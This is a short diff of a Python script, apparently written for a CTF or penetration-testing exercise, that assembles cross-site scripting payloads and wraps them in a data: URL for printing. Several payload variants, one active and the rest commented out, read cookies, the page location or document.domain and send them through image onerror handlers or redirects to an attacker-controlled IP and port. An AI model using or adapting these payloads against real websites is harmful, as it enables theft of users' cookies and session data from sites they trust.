@@ -8,8 +8,9 @@ myport = 8000
 # script = '<script>console.log(top.cookie)</script>'
 # script = '<img src=x onerror="console.log(top.cookie)">'
 # script = f'<a href="http://{myip}:{myport}/index.php?id=bugReport&from=">test</a>'
-# script = f'<img src="x" onerror="window.location.href=\'http://{myip}:{myport}?d=\'+window.location.href">'
-script = f'<img src="http://{myip}:{myport}?x=server2&d="\'+document.domain+\'">\')</script>'
+script = f'<img src="x" onerror="window.location.href=\'http://{myip}:{myport}?d=\'+document.domain">'
+# script = f'<img src="http://{myip}:{myport}?x=server2&d="\'+document.domain+\'">\')</script>'
+# script = f'<script>document.write(\'<img src="http://{myip}:{myport}/?c=\'+document.location+\')">\')</script>'
 payload = f'data:text/html;charset=utf-8,{script}'
 
 print(payload)
